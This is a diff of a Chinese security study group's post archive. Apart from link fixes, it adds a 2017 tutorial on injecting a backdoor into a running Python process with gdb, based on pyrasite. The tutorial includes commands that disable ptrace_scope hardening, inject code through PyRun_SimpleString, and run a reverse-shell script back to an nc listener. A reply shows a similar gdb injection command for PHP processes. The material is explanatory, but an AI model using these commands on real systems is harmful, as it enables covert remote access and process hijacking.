@@ -224,7 +224,7 @@ __#资源#__
 <img src="https://images.xiaomiquan.com/FnOoKbrDQwci7KLouKcprUjZVhzx?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PUjWb19auwxE-ijNLmb8atqNK7w=" width="50%" height="50%" align="middle"/>
 
 __分享文件:__
-[黑客报告2017.pdf](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/黑客报告2017.pdf)
+[黑客报告2017.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/%E9%BB%91%E5%AE%A2%E6%8A%A5%E5%91%8A2017.pdf)
 
 
 ---
@@ -921,13 +921,86 @@ PS:更多的是总结，所以可能有的地方不会很细，建议配合廖�
 
 
 __分享文件:__
-[Python基础笔记1-10章.pdf](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/Python基础笔记1-10章.pdf)
+[Python基础笔记1-10章.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B01-10%E7%AB%A0.pdf)
 
 
 ...
 
 <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 附一个导航页，节约时间
 [安全导航](http://coco413.com/SecNavi/)
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-04:
+
+
+__#姿势#__
+
+ 如何给正在运行的 Python 进程注入后门连接
+
+今天分享个昨晚玩的姿势，首先这个姿势来源这个开源项目 pyrasite：
+
+[GitHub - lmacken/pyrasite: Inject code into runnin...](https://github.com/lmacken/pyrasite)
+
+
+
+这个项目介绍是：Inject code into running Python processes，之前@Moriarty 推荐过这个好工具。
+
+但是我这不是要介绍这个工具的用法，用法直接看其官网的视频（pyrasite.com），一目了然。
+
+我昨晚读了一遍 pyrasite 源码，很快就明白了本质的原理，这里给大家分享下（以 Linux 环境下的情况为例，需要 root 权限）。其实关键语句就这句：
+
+`gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("print(\"hiworld\")")' -eval-command='call PyGILState_Release($1)'`
+
+对，gdb，这是经典的调试神器了，玩过 gdb 的都知道，这个神器支持直接对目标进程运行态进行动态调试，不过这有个前提，需要开启：
+
+`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`
+
+开启后，如上那条 gdb 语句，-p 参数背后跟目标 Python 进程的 pid，我这里测试的是 3142，然后 `-eval-command` 是注入需要执行的命令，仔细看有几个 `-eval-command`，这些命令会顺序执行，最终执行的是 PyRun_SimpleString 函数里的 Python 代码：
+
+`print("hiworld")`
+
+好，现在可以注入 Python 代码，打印 hiworld 了，那么我们注入个反弹到我们的远程 nc 吧。
+
+`gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("exec(open(\"back.py\").read())")' -eval-command='call PyGILState_Release($1)'`
+
+其中，back.py 就是一个反弹脚本，反弹连接到我们的 nc 监听上：
+
+`nc -l -p 1134 -vv`
+
+效果如图所示，相关测试脚本见附件，简单说明下：
+
+t.py 是目标进程，back.py 是反弹脚本，都在 test.zip 里。
+
+[后记]
+
+1. 进程注入，gdb 的这种用法大家可以开脑洞，那么其他类型的进程我们是否也可以这样优雅地注入？
+2. 我们在用一些优秀的工具时，不应该只停留在只会用，如果有源码，我们可以读通其源码，看看作者的思路，是个非常好的学习机会。而且这样下来，你其实比只会用用而已的人更能驾驭这款工具的高阶姿势。
+3. 工欲善其事必先利其器，这也是为什么本圈会介绍些优秀工具的用法或剖析。
+
+<img src="https://images.xiaomiquan.com/FhjYwyDP9bQ70k62Z865kgNT5sEy?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:qJwkqNZR070Utu72QpvX61CM3YM=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/Fre61g-QQP25C6LpeNViNu8rco9i?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dI__gGgAbp-dh0laadkojccPZYI=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/Fsq67FFptePGDtB_Qxe5cNwiAYgj?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jYtsyELcJrPuCMd2wEuWbg14Ak8=" width="50%" height="50%" align="middle"/>
+
+__分享文件:__
+[test.zip](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/test.zip)
+
+
+...
+
+<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 不是做安全的，但搞过php进程的注入，思路类似，写一段py脚本（gdb提供py接口的包装），使用gdb执行～
+
+`eval "gdb --batch -nx ${PHP_BIN} ${PHP_PID} -ex \"source ${PY_SCRIPT_FILE}\" 2>/dev/null"`
+
+另外有有一些库可以动态注入机器码或者so文件，比如linux-inject，安卓上有人用这种技术做坏事，原理本质上一样，都是用了ptrace系统调用，有的软件做了反调试的话，需要想方法绕过～
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 😄赞
+
+<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 现在生产环境中有多少服务器中安装了gdb呢？占的比例大概有多少？
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 不好说
 
 ...
 
